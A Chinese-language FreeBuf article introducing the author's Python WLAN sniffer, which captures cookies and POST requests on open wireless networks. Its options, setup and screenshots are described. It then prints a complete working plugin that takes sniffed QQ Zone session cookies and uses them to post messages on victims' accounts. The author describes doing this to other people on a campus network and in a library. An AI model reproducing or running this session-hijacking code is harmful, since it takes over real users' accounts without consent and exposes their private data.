*** 本文作者：Macr0phag3，本文属FreeBuf原创奖励计划，未经许可禁止转载**

    
    
    _______..__   __.  __   _______  _______  _______ .______      
        /       ||  \ |  | |  | |   ____||   ____||   ____||   _  \      
       |   (----`|   \|  | |  | |  |__   |  |__   |  |__   |  |_)  |    
        \   \    |  . `  | |  | |   __|  |   __|  |   __|  |      /      
    .----)   |   |  |\   | |  | |  |     |  |     |  |____ |  |\  \----.
    |_______/    |__| \__| |__| |__|     |__|     |_______|| _| `._____| v3.0

## 介绍

**有一天我在无意中发现，学校的WLAN是完全开放的。也就是说，身边充满了Cookie与明文密码。然后又发现了add在freebuf发的[一篇文章](http://www.freebuf.com/articles/network/129721.html)，进而对写一个嗅探器的原理愈发有兴趣，于是就有了这个工具。**

总之一句话，这个工具是用来嗅探测试开放WLAN下的数据包，具体嗅探的是含Cookie或者Method为Post的数据包。

*本文提供的工具仅供安全实验和教学用途，禁止非法使用

[Gayhub地址](https://github.com/Macr0phag3/Sniffer)

嗅探器是一个类，有以下参数：

> 1\. -i：可选参数；嗅探使用的原始无线网卡的名字，若不填则代码会自动指定无线网卡
>
> 2\.
> -mi：可选参数；默认值为‘mon0’；由于嗅探需要开启无线网卡的监听模式（monitor），这个是将原始无线网卡改为监听模式后的名字（改为监听模式并非直接改原无线网卡，而是生成一个处于监控模式的虚拟无线网卡）；这个虚拟的无线网卡在嗅探器停止后会自动删除。
>
> 3\.
> -f：可选参数；默认为空；嗅探器可以实时嗅探，也可以解析本地的pcap包，这个参数就是本地pcaps包的名字，注意一定要放在Pcaps目录里；只需填写文件名；
>
> 4\. -o：可选参数；默认为1；嗅探器一旦发现Cookie或者Post的包，就会进行对应的输出，若不想看见实时输出，则置0，否则置1。
>
> 5\.
> -sPkt：可选参数；默认为1；嗅探器发现符合filter的数据时，会对输出的结果进行保存；若不想保存这些结果，置0；默认保存在Pkts下；若置1，则在嗅探结束的时候会提示是否删除本次捕获的所有pkts；
>
> 6\.
> -sPcap：可选参数；默认为0；嗅探器可以保存符合filter的原始数据包；1为保存；0为不保存；默认保存在Pcaps下；若置1，则在嗅探结束的时候会提示是否删除本次捕获的pcap；
>
> 7\. -fm：可选参数；默认为空；与scapy的过滤语法一致，对数据包进行过滤；代码在后面默认过滤自己的ip，以及只嗅探tcp/ip相关的包；
>
> 8\. -iHF：可选参数；在是一个文件（iHost.txt）的路径，默认在当前目录，里面包含的host，在停止嗅探后会高亮显示。​

代码中有插件功能，用意是捕获到指定的数据包时，可以由插件来完成后续的工作。例如，我校的校园网帐号密码可以用cookie拿到，那么这个功能就可以写成插件。弄插件的另一个目的是分离核心代码与其他代码。

举一些使用的例子：

1\.
全部使用默认参数，此时自动指定无线网卡；生成一个虚拟的mon0无线网卡；在线模式；实时输出；保存解析过的Pkt；不保存原始Pcap；过滤为空；iHost.txt在当前目录下；

![2018-03-20 08-45-34
的屏幕截图.png](https://image.3001.net/images/20180320/15215068434982.png!small)

停止：

![2018-03-20 08-46-02
的屏幕截图.png](https://image.3001.net/images/20180320/15215070993184.png!small)

(这里我开启后就停止了，所以没有抓到包，正常情况返回的结果和下面本地解析的一样

2\. 本地解析pcap：

![2018-03-20 08-54-17
的屏幕截图.png](https://image.3001.net/images/20180320/15215072862525.png!small)

![2018-03-20 08-56-01
的屏幕截图.png](https://image.3001.net/images/20180320/15215073791924.png!small)

## 注意

  1. 需要的库：

scapy + scapy_http + argparse + termcolor

这些库可以手动安装。

嗅探器在启动的时候也会自动检查环境并进行修复。

修复是直接使用`sudo pip
install`语句，若电脑中存在多版本的python，注意一下pip的使用，可能需要修改ToolBox中`EnvirTools`的`autoFix`函数语句。

注意：Python 3.x 的scapy需要手动安装（存在一个很无语的问题

[安装scapy for Py3.x](http://scapy.readthedocs.io/en/latest/installation.html)

  2. 配置：

Ubuntu（其他Linux应该也可以）

`pip`，`iw`，`iwconfig`，`ifconfig`需可用

以管理员权限运行

终端的宽度要足够，否则会出现很多换行。因为覆盖同一行输出的时候是用 '\r' 实现的。

  3. Python版本

2.x and 3.x

## 版本更新

  1. v1.0：实现基本功能
  2. v2.0：简化代码，完善自动检查环境脚本，修复n个Bug
  3. v2.0 Py3.x：移植v2.0到Py 3.x
  4. v3.0：增加命令行参数；完善自动检查环境脚本；简化部分代码

## 后续更新

  1. 代码不够简洁（逃
  2. 插件功能的实现没有我希望的那样方便，应该再开一个线程/进程，以免在插件运行的时候嗅探就暂停了。后续会改进。

## 一些话

目前写的比较粗糙，后续有时间会改进。但是功能是比较完善的。个人觉得自己写插件蛮好玩的；例如，空间登陆只需要3种Cookie，我们可以让嗅探器在嗅到这些Cookie的时候发条说说（有点傻）：

    
    
    #encoding: utf8
    import os
    from Toolbox.ColorTools import *
    import re
    from requests import *
    import sys
    def g_tk(p_skey):
        h = 5381
        for c in p_skey:
            h += (h << 5) + ord(c)
        return h & 0x7fffffff
    def SendMsg(uin, skey, p_skey, msg):
        qq = re.findall(r'o0*(\S+)', uin)[0]
        with open('HackQzone.txt', 'r') as fp:
            if qq in fp.read():
                return 0
        try:
            rs = session() 
            cookies = {'uin': uin,
                       'skey': skey,
                       'p_uin': uin,
                       'p_skey': p_skey
                       }
            utils.add_dict_to_cookiejar(rs.cookies, cookies)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36',
            }
            qzoneText = rs.post('http://user.qzone.qq.com/%s' %qq, headers=headers, cookies=cookies, timeout=5).text
            Qzname = re.findall(r'<title>(.+) \[', qzoneText)
            Qname = re.findall(r'textoverflow">(.+)</span>', qzoneText)
            print '[%s][%s][%s]' %(qq, Qname[0], Qzname[0]),
            qzonetoken = re.findall(r'window.g_qzonetoken = \(function\(\)\{ try\{return "(.+)";\} catch\(e\)', qzoneText)[0]
            url = 'https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?qzonetoken=%s&g_tk=%s' %(qzonetoken, g_tk(p_skey))
            data = {'con': 'qm%s' %msg,
                    'hostuin': qq,
            }
            rs.post(url, data=data, timeout=5).text
            print '\a[Hacked]'
            with open('HackQzone.txt', 'a') as fp:
                fp.write(qq+'\n')
            sys.exit(1) # 防止失控
        except Exception, e:
            print '  [%s] [%s]' %(putColor(qq, 'green'), putColor('Failed', 'red')), e
            print 
    def QzoneCookieUsage(args):
        srcip = args[0]
        Cookie = args[1]
        if 'p_skey' in Cookie and 'skey' in Cookie:
            print '\r[' + putColor(srcip, 'cyan') + ']', putColor('Found Qzone Cookie!', 'green'), ' '*80
            print '  [-]%s' %putColor('Hacking...', 'yellow')
            cookie = Cookie.replace(';', '\n')
            skey = re.findall(r'\bskey=(.+)', cookie)[0]
            uin = re.findall(r'uin=(.+)', cookie)[0]
            p_skey = re.findall(r"p_skey=(.+)", cookie)[0]
            SendMsg(uin, skey, p_skey, 'What does the fox say?') # 发条说说

还可以怎么利用呢，蹲在图书馆的角落就可以发一些奇♂怪的东西：

![Image](https://image.3001.net/images/20210506/1620266799_60934f2f919dba00275c8.jpg!small)  

（图是我盗的，逃

后来还发现，qq群相关的包特别多，可以查看/下载/上传群文件等等，危害还蛮大的（图被我吃了

有些厂家的web端都有https（或者说比较全面。但是自家的app等却做得不好，各种明文到处飞（某盘从此成为老司机

没了没了~

 *** 本文作者：Macr0phag3，本文属FreeBuf原创奖励计划，未经许可禁止转载**

